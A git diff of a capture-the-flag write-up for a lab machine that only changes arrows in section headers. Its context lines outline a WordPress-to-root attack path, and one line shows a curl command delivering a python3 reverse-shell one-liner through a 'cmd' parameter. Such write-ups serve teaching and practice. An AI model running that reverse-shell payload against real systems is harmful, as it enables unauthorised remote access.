@@ -33,7 +33,7 @@ PORT     STATE SERVICE VERSION
 
 We can start Burpsuite and begin enumerating the web service.
 
-### Web Enum --> WP Creds
+### Web Enum -> WP Creds
 
 The website just showed two links, and mentions Jira, which is a ticket tracker software.
 
@@ -117,7 +117,7 @@ However, this error popped up:
 
 We'll have to find a different method to get a shell.
 
-### Akismet Plugin --> RCE
+### Akismet Plugin -> RCE
 
 There are 2 plugins installed on the site:
 
@@ -139,7 +139,7 @@ $ curl -G --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket
 
 ## Privilege Escalation
 
-### Autologin --> Katie Shell
+### Autologin -> Katie Shell
 
 This machine was a ChromeOS machine, as specified from the `home` directory:
 
@@ -218,7 +218,7 @@ Using this, we can `ssh` in as `katie`.
 
 <figure><img src="../../../.gitbook/assets/image (4222).png" alt=""><figcaption></figcaption></figure>
 
-### Sudo Privileges --> Root
+### Sudo Privileges -> Root
 
 This user could run `initctl` as the `root` user:
 
